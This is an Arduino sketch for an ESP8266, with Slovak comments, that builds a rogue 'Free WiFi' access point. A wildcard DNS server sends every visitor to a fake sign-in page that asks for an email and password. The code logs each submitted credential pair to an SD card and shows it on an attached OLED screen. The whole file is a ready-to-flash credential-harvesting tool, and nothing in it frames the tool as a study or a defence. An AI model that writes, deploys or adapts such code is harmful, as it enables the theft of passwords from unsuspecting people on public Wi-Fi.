#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h> 
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SD.h>  // Pridaj knižnicu pre SD kartu
#include <SPI.h> // Knižnica pre SPI komunikáciu so SD kartou

// ------------------------------------------------------------------------------
// CONNECTION

// SD Card Module (COnnection for D1 mini SD Card Module with esp8266 NodeMCU)
// VCC -> 3.3V
// GND -> GND
// MOSI -> D6
// MISO -> D7
// SCK -> D5
// CS -> D4

// Oled Display
// VCC -> 3.3V
// GND -> GND
// SCL -> D1
// SDA -> D2
// ------------------------------------------------------------------------------

// OLED nastavenia
#define SCREEN_WIDTH 128 
#define SCREEN_HEIGHT 64 
#define OLED_RESET -1    
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// SD karta nastavenia
#define SD_CS_PIN 4  // Nastav pin pre CS (Chip Select) pre SD kartu (použi správny pin pre tvoj hardware)

// User configuration
#define SSID_NAME "Free WiFi"
#define SUBTITLE "Free WiFi service."
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

// Function prototypes
void displayCredentials(String email, String password);
String posted();
void saveCredentialsToSD(String email, String password); // Pridaj funkciu na uloženie údajov do SD karty

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);  

DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Funkcia na zobrazenie prihlasovacích údajov na OLED displeji
void displayCredentials(String email, String password) {
  display.clearDisplay();
  display.setTextSize(1);      
  display.setTextColor(SSD1306_WHITE); 
  
  display.setCursor(0, 0);     
  display.println("New Credentials:");
  display.println("Email:");
  display.println(email);      
  display.println("Password:");
  display.println(password);   
  
  display.display();           
}

// Funkcia na uloženie údajov na SD kartu
void saveCredentialsToSD(String email, String password) {
  File dataFile = SD.open("/htmldata.txt", FILE_WRITE);  // Otvoríme súbor na zápis

  if (dataFile) {
    dataFile.println("New Credentials:");
    dataFile.print("Email: ");
    dataFile.println(email);     // Uložíme email
    dataFile.print("Password: ");
    dataFile.println(password);  // Uložíme heslo
    dataFile.println("--------------------");
    dataFile.close();  // Zatvoríme súbor
    Serial.println("Data saved to SD card.");
  } else {
    Serial.println("Error opening file for writing.");
  }
}

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; 
}

String posted() {
  String email = input("email");
  String password = input("password");

  // Zobraz email a heslo na OLED displeji
  displayCredentials(email, password);

  // Ulož email a heslo na SD kartu
  saveCredentialsToSD(email, password);

  return header(POST_TITLE) + POST_BODY + "</div><div><p>Email: <b>" + email + "</b></p><p>Password: <b>" + password + "</b></p></div>";
}

void setup() {
  // Inicializácia sériového portu a OLED displeja
  Serial.begin(115200);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("OLED displej sa nepodarilo inicializovať"));
    while(true); 
  }
  
  display.display();      
  delay(1000);            
  display.clearDisplay(); 
  
  // Inicializácia SD karty
  if (!SD.begin(SD_CS_PIN)) {
    Serial.println("Error initializing SD card.");
    return;
  }
  Serial.println("SD card initialized.");

  // Nastavenie Wi-Fi v režime Access Point (AP)
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  
  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
  });
  
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", header(TITLE) + "<form action='/post' method='post'><b>Email:</b> <input type='text' name='email'><br><b>Password:</b> <input type='password' name='password'><br><input type='submit' value='Sign in'></form>");
  });
  
  webServer.begin();
  Serial.println("HTTP server started...");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
